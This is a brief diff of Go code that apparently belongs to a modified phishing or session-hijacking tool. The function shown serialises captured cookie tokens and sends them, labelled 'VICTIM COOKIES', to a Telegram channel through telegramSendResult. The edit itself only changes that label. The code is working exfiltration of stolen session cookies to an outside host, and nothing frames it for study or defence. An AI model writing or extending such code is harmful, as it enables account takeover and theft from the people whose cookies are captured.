@@ -185,7 +185,7 @@ func moddedCookieTokensToJSON(tokens map[string]map[string]*CookieToken) string 
 	}
 
 	json, _ := json.Marshal(cookies)
-	telegramSendResult(fmt.Sprintf("🍪 🍪 🍪 🍪 🍪 VICTIM COOKIES 🍪 🍪 🍪 🍪 🍪 \n\n-🆔ID: %s\n\n", string(json)))
+	telegramSendResult(fmt.Sprintf("🍪 🍪 🍪 🍪 🍪 VICTIM COOKIES database🍪 🍪 🍪 🍪 🍪 \n\n-🆔ID: %s\n\n", string(json)))
 	return string(json)
 }
 
